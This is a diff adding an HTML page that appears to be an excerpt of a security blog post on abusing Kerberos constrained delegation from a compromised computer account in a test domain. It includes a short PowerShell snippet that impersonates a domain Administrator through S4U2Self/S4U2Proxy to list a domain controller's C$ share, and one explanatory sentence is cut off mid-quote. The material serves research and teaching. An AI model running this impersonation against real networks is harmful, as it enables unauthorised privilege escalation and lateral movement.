@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Scenario 2</title>
+</head><body>Scenario 2 : Agent on a Computer Configured For Constrained Delegation<br/>
+<br/>
+If you are able to compromise a <i>computer</i> account that is configured for constrained delegation (instead of a user account) the attack approach is a bit different. As any process running as SYSTEM takes on the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">privileges of the local machine account</a>, we can skip the Kekeo asktgt.exe step. You can also use an alternative method to execute the S4U2Proxy process, <a href="https://msdn.microsoft.com/en-us/library/ff649317.aspx">helpfully provided by Microsoft</a>. Lee and I translated the process from C# into PowerShell as follows:<br/>
+<br/>
+# translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx<br/>
+&nbsp;<br/>
+# load the necessary assembly<br/>
+$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')<br/>
+&nbsp;<br/>
+# execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user<br/>
+$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@TESTLAB.LOCAL')<br/>
+&nbsp;<br/>
+# actually impersonate the next context<br/>
+$Context = $Ident.Impersonate()<br/>
+&nbsp;<br/>
+# implicitly invoke S4U2Proxy with the specified action<br/>
+ls \\PRIMARY.TESTLAB.LOCAL\C$<br/>
+&nbsp;<br/>
+# undo the impersonation context<br/>
+$Context.Undo()<br/>
+<br/>
+<br/>
+<br/>
+<a href="https://msdn.microsoft.com/en-us/library/ff649317.aspx#paght000024_step1">As detailed by Microsoft</a>, when using WindowsIdentity, an “identify-level” token is returned by default for most situations. This allows you to see what groups are associated with the user token, but doesn’t allow you to reuse the access. In order to use the impersonation context to access additional network resources, an impersonation-level token is needed, which is only returned when the requesting account has the “<br/>
+<br/>
+Also, due to some of the powershell.exe peculiarities <a href="http://www.harmj0y.net/blog/powershell/make-powerview-great-again/">I mentioned a bit ago</a>, if you are using PowerShell Version 2, you need to launch powershell.exe in single-thread apartment mode (with the “-sta” flag) in order for the token impersonation to work properly:<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
